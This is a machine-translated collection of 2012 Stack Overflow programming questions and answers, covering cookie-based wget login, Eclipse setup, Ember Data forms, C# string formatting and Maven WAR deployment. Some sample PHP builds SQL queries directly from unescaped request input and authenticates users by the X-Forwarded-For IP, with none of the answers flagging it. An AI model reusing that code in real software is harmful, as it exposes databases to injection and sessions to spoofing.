wget -q --keep-session-cookies --save-cookies savedcookie.txt --post-data="sign_on_request=$sign_on_request" -O - $base_url/login > /dev/null 2>&1
# Save CSV
wget -q --load-cookies savedcookie.txt -O output.txt $base_url/data 
```

这是我尝试过的：

```
import mechanize
import cookielib

# Browser
br = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

# Login
req = mechanize.Request("https://myapp.url.com/login", "sign_on_request=aK8Rj_mrVk3J-PDf9x6...LONG KEY...4ZPMd0w")
cj.add_cookie_header(req)
res = mechanize.urlopen(req)

# Download
f = br.retrieve('https://myapp.url.com/data')[0]
print f 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:51:20.297

你试过`res = br.open("https://myapp.url.com/login", data=...)`代替`mechanize.Request`吗？如果您希望它能够进行检索，似乎您需要使用您创建的浏览器进行登录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:50:36.227

你可以使用`br.set_cookie("cookiename=cookievalue; expire=Wednesday, 13-Feb-13 15:00:00 GMT")`但是这种方法只有在你调用了某个网站后才有效。使用相同的对象 br 调用更多页面，以便在 br.open() 方法中自动发送此 cookie。

# c - wascana eclipse 简单 C 代码 启动失败 未找到二进制文件

> ID：12146047
> 
> 赞同：1
> 
> 时间：2012-08-27T16:43:26.793
> 
> 标签：c, eclipse

我是 Eclipse CDT 的新手。我做了一些在线搜索，但我迷路了。我安装了 MinGW（在命令窗口中运行良好），然后我安装了 Eclipse Helios wascana。我确实将路径/环境添加到 Properties->C/C++ build -> enviroment (C:\MinGW\bin) Eclipse 下划线 `#include <stdlib.h>` #include #include 未解决的包含。我想我没有将它链接到 MinGW 库。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-23T17:29:01.260

转到：- 属性> C/C++ 构建> 工具链编辑器>

然后，选择：-

```
 Current Tool chain as --> Cygwin GCC 
```

和，

```
 Current builder as --> CDT Internal Builder 
```

它对我有用。希望它也适用于你和其他人！:)

编辑：对于 linux 用户

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T23:55:46.730

就我而言，我执行了以下操作：Properties->C/C++ Build -> Tool Chain Editor 然后我选择 MinGw GCC 作为当前工具链。看起来它现在可以工作了。给它一个展示

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T19:02:30.467

即使编译器确实没问题，我也会收到此错误，因此只有构建/重建（有时）和启动新项目可能会有所帮助。可能不是你的情况，但 Eclipse 非常“喜欢”这个错误，这就是我发现的

# javascript - 在验证另一个表单后提交表单

> ID：12146050
> 
> 赞同：-2
> 
> 时间：2012-08-27T16:43:29.577
> 
> 标签：javascript, forms

在这里，我有两个 HTML 表单。 **登录表单**

```
<form name="login" method=post action="http://xxxx.com/auth.asp">  
<input type=hidden id=UserName name="userid" value="xxxxx"></input> 
<input type=hidden id=Password name="password" value="yyyyyy"></input> 
</form> 
```

**另一种形式**

```
<form name="action" method=post action="http://xxxxxx.com/user/xxxxx.asp">  
<input type=hidden id=UserName name="xxxxxx" value="xxxxx"></input> 
<input type=hidden id=Password name="yyyyyy" value="yyyyy"></input> 
</form> 
```

我只需致电即可提交我的第一份表格

```
document.login.submit() 
```

但是在执行上述语句之后，它下面的任何代码都不会被执行。我必须在上述代码之后执行以下代码：

```
document.action.submit() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T21:06:28.467

如果您提交的表单没有 ajax，浏览器会执行重定向或页面刷新。这将导致其余的 javascript 停止执行。

# c - C中的快速乘法代码

> ID：12146052
> 
> 赞同：1
> 
> 时间：2012-08-27T16:43:31.747
> 
> 标签：c

我正在研究乘法源代码，但我不明白这个乘法函数`x*A`。请用任何数字示例帮助我理解这一点？

```
#define BITS_PER_LONG (8 * sizeof (unsigned long))

typedef struct matrix{
int rown;//number of rows.
int coln;//number of columns.
int rwdcnt;//number of words in a row
int alloc_size;//number of allocated bytes
unsigned long *elem;//row index.
}*binmat_t;

void mat_vec_mul(unsigned long *cR, unsigned char *x, binmat_t A)
{
    int i,j;
    unsigned long *pt;

    memset(cR, 0, A->rwdcnt*sizeof(long));
    pt = A->elem;
    for(i=0; i<A->rown; i++)
    {
        if ((x[i/8] >> (i%8)) & 1)
            for (j = 0;  j < A->rwdcnt;  ++j)
                cR[j] ^= *pt++;
        else
            pt += A->rwdcnt;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:08:02.080

x 是位向量，存储在 char 数组中。x 中的位数是 A->rown。该表达式选择 x 的^第`(x[i/8] >> (i%8)) & 1`i位。

A 是 unsigned long 的二维数组，具有 A->rown 行和 A->rwdcnt 列。

cR 是带有 A->rwdcnt 元素的 unsigned long 向量。进入此例程时清除 cR。

该`if`语句确定 x 中的第 i^位是否打开。如果该位打开，则将 A 的第 i^列“添加”到 cR。如果该位为关闭，则`else`子句跳过 A 的这一列。由于一个位只能有 1 或 0 的值，这`if-else`相当于将 A 的列乘以该位并将乘积与 cR 相加。

“加法”由 XOR 完成。这里的解释不清楚。可能每个 cR 是单个位数组（和 A 的每一列），或者可能是每个 cR（和 A）中的 unsigned long 表示整数模二上的多项式。（这是密码学中的常见类型。）

我怀疑 cR 是单个位数组，并且 A->rwdcnt = A->coln / BITS_PER_LONG。

实际上，这是对整数模二的标准数组乘法。

# c# - 找出多线程 C# 程序卡在哪里

> ID：12146055
> 
> 赞同：4
> 
> 时间：2012-08-27T16:43:47.393
> 
> 标签：c#, visual-studio, debugging

我编写了一个有几千行和几个线程的 C# 程序。执行可以正常运行几个小时/几天，直到在 Windows 服务器上运行的应用程序开始减慢所有内容（其他程序/Web 服务器），因为它突然开始占用大约 50-80% 的 CPU。

我假设它卡在了某个 while 循环中，但我不知道具体在哪里。知道哪个线程占用了系统资源的最大份额已经很有帮助。由于没有抛出任何异常，我看不到任何直接的可能性。

代码已经过检查，但我没有发现任何重大/明显的编程错误。

有没有人知道让 Visual Studio 监视当前 CPU 负载以显示它在哪里用完的好方法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T16:47:39.823

哦，我多么喜欢托管堆栈资源管理器。[http://mse.codeplex.com/](http://mse.codeplex.com/)对于大多数版本的 .NET 和[https://github.com/vadimskipin/MSE](https://github.com/vadimskipin/MSE)对于 4.0

将它指向您正在运行的应用程序，它会为每个线程的堆栈生成快照。在查看一些快照后，您将找出问题所在。哦，当我第一次了解到这一点时，我所面临的问题很糟糕。哦，当它让我在短短几分钟内找到我一直在寻找的东西时，真是太高兴了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T16:48:47.350

发生这种情况时，您可以使用 Perfview (http://www.microsoft.com/en-us/download/details.aspx?id=28567) 来捕获和分析 ETL 跟踪。

# php - Symfony 1.4.18 和 PHP 5.4 兼容性

> ID：12146058
> 
> 赞同：1
> 
> 时间：2012-08-27T16:44:09.653
> 
> 标签：php, symfony1, symfony-1.4

最新的 Symfony 版本 (1.14.18) 是否应该与 PHP 5.4 一起正常运行？

我刚刚在本地升级到 PHP 5.4，以前运行良好的多个站点现在在尝试加载任何页面时都会抛出以下错误：

```
Fatal error: Call to undefined method sfCoreAutoload::register() in C:\dev\projects\my_site\config\ProjectConfiguration.class.php on line 4 
```

sfCoreAutoload 类的路径很好，但由于某种原因，它把它当作根本不存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T19:31:57.820

我设法解决了这个问题，所以为了其他面临同样问题的人的利益，我只想在这里回答。罪魁祸首是 APC。预编译 APC (3.1.9) 的最新“稳定”版本不适用于 Symfony 1.4.18 + PHP 5.4.4，但使用 APC beta (3.1.12) 可以。

# python - 使用python在路径字符串列表中查找公共父路径字符串列表

> ID：12146064
> 
> 赞同：1
> 
> 时间：2012-08-27T16:44:38.290
> 
> 标签：python, filesystems

使用python在路径字符串列表中查找最长公共父路径字符串列表的最有效方法是什么？

*附加说明*如果有两个或更多匹配项，我想根据需要下降以创建尽可能少的冗余

**输入列表**

```
input_paths = [
  '/path/to/a/directory/of/files',
  '/path/to/a/directory/full/of/files',
  '/path/to/some/more/files',
  '/path/to/some/more/directories/of/files'
  '/path/to/another/file',
  '/mount/another/path/of/files',
  '/mount/another/path/of/test/stuff',
  '/mount/another/path/of/files/etc',
  '/mount/another/drive/of/things',
  '/local/folder/of/documents'
] 
```

**输出列表**

```
common_prefix_list = [
  '/path/to/a/directory',
  '/path/to/some/more',
  '/path/to/another',
  '/mount/another/path/of',
  '/local/folder/of'
] 
```

我的初步猜测是在 os.sep 上拆分为列表，然后使用集合交集，但我相信有更强大的算法可以找到本质上最长的公共子字符串问题。我确信这已经完成了一百万次，所以请提供你优雅的解决方案。

*我的最终任务是将不同路径中项目共有的资产列表收集到一个公共文件夹中，该文件夹的结构不会与单个资产产生冲突，也不会创建过度冗余的路径。*

# ember-data - ember 数据如何处理表单

> ID：12146067
> 
> 赞同：3
> 
> 时间：2012-08-27T16:44:42.923
> 
> 标签：ember-data

我正在尝试构建一个示例，用于通过带有 Ember Data 的表单来处理对象的创建以插入数据库。

到目前为止，我的商店在客户端显示结果，但就将数据处理到服务器而言，似乎我的数据始终未定义并创建空白记录。

目前，我的 php API 还没有完善（这就是它允许空白插入的原因），但由于我正在运行测试，所以我只关心将其输入数据库的数据。

我应该如何使用 Ember Data 处理表单？（为什么它使用'createRecords'方法而不是'createRecord'？）

所有的帮助都将不胜感激，我真的很想用 Ember 解决问题，并希望我不必放弃并切换到另一个框架。

这是我的代码，我试图通过表单和直接通过代码创建一个人。
**灰烬/JS：**

```
App = Em.Application.create();

App.Person = DS.Model.extend({
    id: DS.attr('string'),
    name: DS.attr('string'),
    lastname: DS.attr('string'),

    didLoad: function() { 
        console.log(this.get('lastname') + " finished loading.");
    }
}).reopenClass({ 
    url: '../api/index.php?model=entity',
});

App.adapter = DS.Adapter.create({
    findAll: function (store, type) {
        var url = type.url+'&method=read';
        $.getJSON(url, function(data) {
            store.loadMany(type, data);
        });
    },
    createRecord: function (store, type, model) {
        console.log(id);
        var url = type.url+'&method=create'

        $.ajax({
            url: url,
            data: model.get('data'),
            //data: id,
            dataType: 'json',
            type: 'POST', 
            success: function(data) {
                console.log('didCreate');

            }
        })
    },
    createRecords: function (store, type, array) {
        $.ajax({
            url: type.url+'&method=create',
            data: array.mapProperty('data'),
            dataType: 'json',
            success: function(data) {
                 store.didCreateRecords(type, array, data);
            }
        })
    },
    find: function(store, type, id) {
        console.log('find one');
        var url = type.url;
        url = url.fmt(id);
        $.getJSON(url, function(data) {
            store.load(type, id, data);
        });
    }
});

App.store = DS.Store.create({
  revision: 4,
  adapter: App.adapter
});

App.personController = Ember.ArrayController.create({
    content: [],
    init: function(){
        this._super();
        this.set('content', App.store.findAll(App.Person));
    },
    loadCode: function() {
        content: [];
        var self = this; 
        var wycats = App.store.createRecord(App.Person,  {"id":"", "name":"12", "lastname":"Steve"});
        App.store.commit();
        console.log('from file');             

    },
    submitForm: function(event) {
        console.log('Called Sumbit');
        App.store.createRecord(App.Person, this.get("content"));
        App.store.commit();
    }

});

App.personView = Ember.View.extend({
    templateName: 'text'
}); 
```

**HTML：**

```
<script type="text/x-handlebars">
<b>{{App.title}}</b><br>
{{view App.personView}}
Count: ({{App.personController.length }})
{{#each App.personController}}            
    <p>{{lastname}} {{name}}</p>
{{/each}}
</script> 
<script type="text/x-handlebars" data-template-name="text">
    <h2>Create from Code</h2>
    <div class="send_form">
            <button {{action "loadCode" target="App.personController"}}>Create</button>
        <hr>
         <h2>Create from Form</h2>
    First name: {{view Ember.TextField valueBinding="lastname"}} <br/>
    Last name:  {{view Ember.TextField valueBinding="name"}} <br/>

    <button {{action "submitForm" target="App.personController"}}>Create</button>

    <h3>Current values: {{name}} {{lastname}}</h3>

    </div>
</script>​ 
```

**以及后端 API (PHP)：**

```
<?php

    require_once 'config.php';

    if (!$errors) {

    $method = mysql_real_escape_string($_GET['method']);
    $model  = mysql_real_escape_string($_GET['model']);
    $format = mysql_real_escape_string($_GET['format']);
    if($method === ''){
        $method = mysql_real_escape_string($_POST['method']);
    }
    switch ($method) {
        case 'create' :

                $fieldlist=$vallist='';
                foreach ($_POST as $key => $value) {
                    $fieldlist.=$key.',';
                    $vallist.='\''.urlencode($value).'\','; 
                }
                $fieldlist=substr($fieldlist, 0, -1);
                $vallist=substr($vallist, 0, -1);
                $return.= $vallist.' (val)
                ';
                $return.= $fieldlist .' (field)
                ';
                $query='INSERT INTO `test_'.$model.'` ('.$fieldlist.') VALUES ('.$vallist.')'; 
                $sql = mysql_query($query) or
                    die ('Error while getting data'.mysql_error());
                $return= $sql;

            break;

        case 'read' :
                $query = "SELECT * FROM  `test_{$model}`";
                $result = mysql_query($query);
                $return = array();
                while($row = mysql_fetch_assoc($result)) {
                     $return[] = $row;
                }
                $return= json_encode($return);
            break;

        case 'reads' :
                $query = "SELECT * FROM  `test_{$model}`";
                $result = mysql_query($query);
                $return='{ "'.$model.'" : ';
                $resultados = array();
                while($row = mysql_fetch_assoc($result)) {
                     $resultados[] = $row;
                }
                $return.= json_encode($resultados);
                $return.=' }';

            break;

    }

    mysql_close();

    switch ($format) {
        default :
                echo $return;
            break;
    }
}

?> 
```

# django - 如何将 3-legged OAuth 系统与 2-legged OAuth 系统集成

> ID：12146070
> 
> 赞同：1
> 
> 时间：2012-08-27T16:44:56.783
> 
> 标签：django, oauth, integration, django-authentication, 2-legged

我有一个系统使用带有 2-leged OAuth 的用户帐户提供主要服务。我还有另一个系统提供 API 服务来调用，但它使用 3-legged OAuth 进行身份验证。目前，2个系统拥有独立的用户群。现在我想保留主系统用户群并将API系统调用集成到主系统，一些如何删除API系统中的用户群（我的意思是保留它但不再使用它）。

用户案例如下：

*   主系统用户注册账号（一）
*   在 API 系统上自动创建了另一个帐户 (2)
*   每当主系统需要从 API 系统获取/保存信息（CRUD 任务）时，它将使用 (2) 中自动创建的用户信息执行 3-legged OAuth，以对 API 系统进行身份验证并执行各自的任务。(3)

实现这样的集成的选项是什么？我不想更改两个系统的代码库，不从主系统或 API 系统中完全删除 OAuth 是不可能的。两个系统都使用 Python Django 框架。

# c# - 在当前构造函数的主体之后调用基本构造函数

> ID：12146075
> 
> 赞同：1
> 
> 时间：2012-08-27T16:45:13.610
> 
> 标签：c#, .net, oop, visual-studio-2012, telerik-open-access

我正在为我的 Telerik OpenAccess ORM 库自定义代码生成模板之一。由于业务规则，我必须将连接到数据库的用户名和密码作为加密字符串放在配置文件中。我没有这个要求的权力，因此我**无法避免它**。

我所做的是创建一个提供解密凭据并修改代码生成模板以使用它的单例类。这是我正在修改的模板的一部分：

```
public <#= contextClass.Name #>()
        :base(connectionStringName, backend, metadataSource)
{
    Credentials credentials = Credentials.Instance;
    string connectionString = String.Format("DATA SOURCE={0};PASSWORD={1};PERSIST SECURITY INFO=True;USER ID={2}", 
                                             credentials.DatabaseServer,
                                             credentials.DatabasePassword,
                                             credentials.DatabaseUser);

}

public <#= contextClass.Name #>(string connection)
    :base(connection, backend, metadataSource)
{ }

public <#= contextClass.Name #>(BackendConfiguration backendConfiguration)
    :base(connectionStringName, backendConfiguration, metadataSource)
{ }

//More constructors..... 
```

所有模板都生成构造函数，主体内没有代码。我想要的是创建我的连接字符串，然后将其用于基类（`OpenAccessContext`）的构造函数。我希望这是我的默认构造函数，你可以通过我修改的无参数构造函数来判断——`public <#= contextClass.Name #>()`

让我难过的是如何创建这个字符串，然后在我的基类的构造函数中使用它。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:53:06.773

您不能`base(...)`在构造函数的末尾调用，但您应该能够执行以下操作：（注意该方法必须是`static`）

```
static string GetConnString() { /* insert credentials and conn string code here */ }

public <#= contextClass.Name #>()
    :base(GetConnString(), ... 
```

或者如果我误解了你的问题，也许这就是你需要的？

```
public <#= contextClass.Name #>(string connection)
  :this()
{ /* handle connection */ }

public <#= contextClass.Name #>(BackendConfiguration backendConfiguration)
  :this()
{ /* handle backendConfiguration */ } 
```

# python - 我可以从代理后面使用 python-couchdb 吗？

> ID：12146080
> 
> 赞同：2
> 
> 时间：2012-08-27T16:45:22.550
> 
> 标签：python, couchdb

我正在尝试连接到另一台机器上的 couchdb 服务器。我需要使用我的代理设置才能连接。

当我从命令行运行以下命令时：

```
curl -x "localhost:3128" http://<couchdb url>:<port> 
```

我得到了成功的回应：

```
{"couchdb":"Welcome","version":"1.2.0"} 
```

当我尝试通过 python-couchdb 连接时

```
couch = Server('http://<couchdb url>:<port>')
db = couch['db_name'] 
```

我得到错误：

```
socket.gaierror: [Errno 8] nodename nor servname provided, or not known 
```

我不知道如何告诉 python-couchdb 代理设置。有什么建议吗？

# c# - 创建排序列表的单一方法 其中 T ：基类

> ID：12146087
> 
> 赞同：0
> 
> 时间：2012-08-27T16:45:58.350
> 
> 标签：c#, generics, inheritance, instantiation, abstraction

我有一个可投票项目的界面：（如 StackExchange、Reddit 等......）

```
// Irrelevant properties left out (Creator, Upvotes, Downvotes, etc)
internal interface IVotable
{
    double HotScore { get; set; }
    double VoteTotal { get; set; }
    DateTime CreatedDate { get; set; }
} 
```

我有一个具体的基类，它扩展了这个接口并定义了一个构造函数来填充默认属性：

```
internal class SCO : IVotable
{
    public double HotScore { get; set; }
    public double VoteTotal { get; set; }
    public DateTime CreatedDate { get; set; }

    public SCO(SPListItem item, List<Vote> votes)
    {
        VoteTotal = UpVotes - DownVotes;
        HotScore = Calculation.HotScore(Convert.ToInt32(UpVotes), Convert.ToInt32(DownVotes), Convert.ToDateTime(item["Created"]));
        CreatedDate = Convert.ToDateTime(item["Created"]);
    } 
```

这是一个正在使用的类的示例，它扩展了这个基类及其构造函数：

```
class Post : SCO
{
    public string Summary { get; set; }
    public Uri Link { get; set; }

    public Post(SPListItem item, List<Vote> votes)
        : base(item, votes)
    {
        Summary = (string) item["Summary"];
        Link = new UriBuilder((string) item["Link"]).Uri;
    }
} 
```

超过 90% 的时间，我会返回已排序的类集合以在页面上呈现。

我希望有某种通用方法，它接收数据库项目的集合、与项目匹配的投票列表、创建列表，然后根据传递的定义如何排序的 ENUM 对列表进行排序。

我尝试了一些方法，其中许多基于以前的帖子。我不确定我是否以正确的方式处理这个问题。虽然这些解决方案确实有效，但我看到很多 Boxing、Reflection 或某种（可能主要的）牺牲性能以提高可读性或易用性。

只要该类扩展基类，创建可以在任何后续子类中使用的对象的排序列表的最佳方法是什么？

**以前有效的方法：**

[从基类创建 <T> 列表](https://stackoverflow.com/questions/12117980/create-a-list-of-t-from-a-base-class/12118019#12118019)

`<T>`嵌入在基类中的通用列表，`Activator.CreateInstance`使用反射扩展以返回列表：

```
public static List<T> SortedCollection<T>(SPListItemCollection items, ListSortType sortType, List<Vote> votes) where T : SCO 
```

**索取使用样品：**

```
 static public List<Post> Get100MostRecentPosts(ListSortType sortType)
    {
        var targetList = CoreLists.SystemAccount.Posts();
        var query = new SPQuery
                        {
                            Query = "<OrderBy><FieldRef Name=\"Created\" Ascending=\"False\" /></OrderBy>",
                            RowLimit = 100
                        };
        var listItems = targetList.GetItems(query);
        var votes = GetVotesForPosts(listItems);
        return Post.SortedCollection<Post>(listItems, sortType, votes);
    } 
```

# php - HTML 中包含的 PHP 代码不会更新

> ID：12146092
> 
> 赞同：0
> 
> 时间：2012-08-27T16:46:33.663
> 
> 标签：php, html, include

我目前有一个 PHP 文件，它将搜索我的 MySQL 数据库并查看用户是否已登录。如果他们已登录，它将回显“Welcome 'username'. Logout”，如果他们未登录，它将回显“登录。注册。”

如果我直接查看此 PHP 文件，它将回显正确的文本，具体取决于我是否登录。但是，如果我使用 include 放入我的 HTML 文件，它只会回显已注销的文本，无论是否我已登录。

PHP 和 HTML 之间是否存在一些冲突，可能会阻止它打印出正确的文本？看起来很奇怪，它可以打开 PHP 文件本身，但当它包含在 HTML 中时却不行。

HTML 代码：

```
<?php include "loginreg/check.php"; ?> 
```

它在子文件夹中的事实会有所不同吗？没有包含 PHP 代码，因为它本身正在工作，但如果您需要查看它，我已经得到它。

干杯

PHP代码：

```
// Gets IP address
$ip = visitorIP();

// Connect to database
mysql_connect(localhost, $username, $password);
@mysql_select_db($database) or die('Unable to select database');

$query  = "SELECT * FROM loggedin WHERE userip='$ip'";
$result = mysql_num_rows(mysql_query($query));
if ($result == '0') {
    mysql_close();
    loggedOut();
    return;
}

if (isset($_COOKIE['sid'])) {
    $sessionid = $_COOKIE['sid'];
}

$result = mysql_query($query);
while ($row    = mysql_fetch_assoc($result)) {
    if ($row['sessionid'] == $sessionid) {
        mysql_close();
        loggedIn($row['id']);
    } else {
        mysql_close();
        loggedOut();
    }
}

function visitorIP() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $TheIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $TheIp = $_SERVER['REMOTE_ADDR'];
    }
    return trim($TheIp);
}

function loggedIn($id) {
    global $username, $password, $database;
    mysql_connect(localhost, $username, $password);
    @mysql_select_db($database) or die('Unable to select database');

    $query  = "SELECT * FROM users WHERE id='$id'";
    $result = mysql_query($query);

    while ($row = mysql_fetch_assoc($result)) {
        $fname = $row['fname'];
        $sname = $row['sname'];
    }

    echo "<div class=\"fltrt\">Welcome, " . $fname . ". <a href=\"http://redsquirrelsoftware.co.uk/loginreg/logout.php\">Logout</a></div>";
}

function loggedOut() {
    echo "<div class=\"fltrt\"><a href=\"http://redsquirrelsoftware.co.uk/loginreg/login.html\">Login</a> <a href=\"http://redsquirrelsoftware.co.uk/loginreg/register.html\">Register</a></div>";
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T16:52:05.417

没有看到这两个脚本的代码，这只是一个猜测，但一个可能的问题是您在包含`loginreg/check.php`脚本之前输出了 html（任何东西......）。

`session_start()`由于标头已经发送，这将使您包含的文件中的任何语句都无用。无法参加会议会导致您描述的错误。

**编辑：**对于 cookie，同样的原则适用，它们需要在发送标头之前设置，因此在您向浏览器输出任何内容之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:13:45.557

您的问题是您在子目录中设置 cookie。使用`path`参数`setcookie`确保您在网站的根文件夹中设置 cookie：

```
// Sets the cookie for the root of the domain:
setcookie("username", "foo", time() + 60 * 60, "/"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-23T16:11:01.773

如果我在这里错了，请纠正我，但是您是否尝试在 HTML 文件中使用 PHP 包含？如果是这样，那将永远不会起作用（除非您有一些自定义服务器配置可以解析 HTML 文件中的 PHP 代码）。

PHP 代码用于 PHP 文件。HTML 代码可以在 HTML 和 PHP 文件中工作。您不能在 HTML 文件中执行 PHP 包含。

# ios - iOS - 向同一个项目添加多个目标？

> ID：12146095
> 
> 赞同：1
> 
> 时间：2012-08-27T16:46:53.953
> 
> 标签：ios, xcode

我正在尝试将 3 个目标添加到我现有的项目中。开发、质量保证和产品。问题是，当我重命名目标时，在构建过程中它会查找目标名称作为我的项目根文件夹，所以我收到一堆构建错误，因为我的所有标题搜索路径、库搜索路径现在都已损坏。

无论目标名称是什么，是否可以让 Xcode 使用相同的项目根名称？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:12:26.610

您是否更改了下面框中的名称？我在名字脱离苏格兰短裙时遇到了类似的问题，如果我记得的话，事实证明这是关键。如果你有一个目标并且想要复制它，我应该添加，你可以选择一个，然后右键单击并获得一个重复的上下文菜单。

![在此处输入图像描述](../Images/82ae2a0620f6b4efdb0f19c7a6e2668b.png)

编辑：然后，转到管理方案并确保那里的名称正确，而不是“项目副本”。如果一切都失败了 grep 你在终端中寻找“复制”的项目 - 你可能必须用 vi 编辑项目文件（它在 Xcode 中关闭！）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T20:56:37.637

我发现了问题所在：我的框架搜索路径中的 $(SRCROOT)/$(PRODUCT_NAME)。$PRODUCT_NAME 用于查找项目的根目录，由于所有目标都指向同一个项目，我最终硬编码了项目名称。$(SRCROOT)/我的项目。

# c# - 字符串格式只有一位小数？

> ID：12146100
> 
> 赞同：26
> 
> 时间：2012-08-27T16:47:12.297
> 
> 标签：c#, .net

我只想显示一位小数。我尝试了以下方法：

```
string thevalue = "6.33";
thevalue = string.Format("{0:0.#}", thevalue); 
```

结果：6.33。但应该是6.3？即使 0.0 也不起作用。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-27T16:48:30.683

你需要它是一个浮点值才能工作。

```
double thevalue = 6.33; 
```

[这是一个演示。](http://ideone.com/W6wpU)现在，它只是一个字符串，所以它会按原样插入。如果您需要解析它，请使用`double.Parse`or `double.TryParse`。（或`float`，或`decimal`。）

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-08-27T17:29:00.243

这是另一种根据需要格式化浮点数的方法：

```
string.Format("{0:F1}",6.33); 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-08-27T17:12:20.033

以下是一些需要考虑的不同示例：

```
double l_value = 6;
string result= string.Format("{0:0.00}", l_value );
Console.WriteLine(result); 
```

输出：6.00

```
double l_value = 6.33333;
string result= string.Format("{0:0.00}", l_value );
Console.WriteLine(result); 
```

输出：6.33

```
double l_value = 6.4567;
string result = string.Format("{0:0.00}", l_value);
Console.WriteLine(result); 
```

输出：6.46

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2012-08-27T17:02:36.430

ToString() 简化了工作。 `double.Parse(theValue).ToString("N1")`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-27T16:50:55.883

选项1（让它成为字符串）：

```
string thevalue = "6.33";
thevalue = string.Format("{0}", thevalue.Substring(0, thevalue.length-1)); 
```

选项2（转换它）：

```
string thevalue = "6.33";
var thevalue = string.Format("{0:0.0}", double.Parse(theValue)); 
```

选项 3（启动 RegEx）：

```
var regex = new Regex(@"(\d+\.\d)"); // but that everywhere, maybe static
thevalue = regexObj.Match(thevalue ).Groups[1].Value; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-04-27T00:50:39.040

请这个：

```
String.Format("{0:0.0}", 123.4567); // return 123.5 
```

# tomcat - 构建一个可以被Maven Tomcat插件部署的war文件

> ID：12146107
> 
> 赞同：2
> 
> 时间：2012-08-27T16:47:50.210
> 
> 标签：tomcat, maven, war, vaadin

从技术上讲，这不是一个编程问题，而是一个关于我从 Maven 项目部署我的 war 文件时遇到的错误的问题。

在构建我的战争文件、运行 Tomcat7 并打开浏览器后，我得到的错误是：

```
HTTP Status 404 - /vaadin-test/

type Status report

message /vaadin-test/

description The requested resource (/vaadin-test/) is not available. 
```

我使用[Vaadin](http://vaadin.com)作为我的网络应用平台。我有一个非常简单的项目，我正在尝试运行以进行测试。我在我的 POM 文件中使用`tomcat7-maven-plugin`and 。`maven-war-plugin`战争插件配置看起来像这样（我认为我什至不需要过滤）：

```
 <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-war-plugin</artifactId>
            <version>2.2</version>

            <configuration>
                <packagingExcludes>WEB-INF/web.xml</packagingExcludes>
                <warName>vaadin-test</warName>

                <webResources>
                    <resource>
                        <directory>src/main/webapp/</directory>
                        <filtering>true</filtering>

                        <includes>
                            <include>**/*.xml</include>
                        </includes>
                    </resource>
                </webResources>
            </configuration>
        </plugin> 
```

web.xml 如下所示：

```
<servlet>
    <servlet-name>myservlet</servlet-name>
    <servlet-class>com.vaadin.terminal.gwt.server.ApplicationServlet</servlet-class>

    <init-param>
        <param-name>application</param-name>
        <param-value>com.catalystitservices.vaadin.TestApp</param-value>
    </init-param>
</servlet>

<servlet-mapping>
    <servlet-name>myservlet</servlet-name>
    <url-pattern>/test-app</url-pattern>
</servlet-mapping> 
```

无论我尝试运行`mvn tomcat7:run`还是将创建的 war 文件部署到外部 Tomcat 服务器（通过管理器页面），我都会收到相同的错误。这让我认为我没有正确构建战争文件。我找不到任何错误日志（但也许我错过了它们）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T16:51:39.287

如果你没有`<finalName>`在你的`<build>`块中指定，Maven 将创建一个如下格式的战争名称：

```
vaadin-test-1.0.war 
```

`vaadin-test`工件名称在哪里`1.0`，版本字符串在哪里。

因此，您必须参考的网址`/vaadin-test-1.0`不是`/vaadin-test`

此外，您的 vaadin servlet 绑定到 url /test-app 因此在添加 finalName 标记后，完整的 URL 应该类似于：`/vaadin-test/test-app`

注意！请注意，`1.0`这里只是一个例子，`pom.xml`实际价值请自行咨询

# asp.net-mvc-routing - 获取请求正在正确解析我的控制器，但没有调用正确（或任何）操作

> ID：12146109
> 
> 赞同：2
> 
> 时间：2012-08-27T16:48:02.017
> 
> 标签：asp.net-mvc-routing, asp.net-web-api

我有一个包含两个模型的 Web 项目 -`IndicatorModel`和`GranteeModel`. 我还为每个 -`IndicatorsController`和`GranteesController`. 我计划将此设置用于数据 API 以及我的实际 Web 项目，因此我在我的项目中创建了一个名为“Api”的新区域。在我的`ApiAreaRegistration`课堂上，我正在为这些控制器注册路由，如下所示：

```
context.Routes.MapHttpRoute(
  name: "ApiDefault",
  routeTemplate: "api/{controller}/{id}",
  defaults: new { id = RouteParameter.Optional }
); 
```

基本上，一个请求`http://myapp/api/indicators/123`应该发送到 Indicators 控制器，并且它应该由一个接受整数参数的操作方法专门处理。我的控制器类设置如下，它运行良好：

```
public class IndicatorsController : ApiController
{
    // get: /api/indicators/{id}
    public IndicatorModel Get(int id)
    {
        Indicator indicator = ...// find indicator by id
        if (indicator == null)
        {
            throw new HttpResponseException(HttpStatusCode.NotFound);
        }
        return new IndicatorModel(indicator);
    }
} 
```

我的`GranteesController`班级设置相同：

```
public class GranteesController : ApiController
{
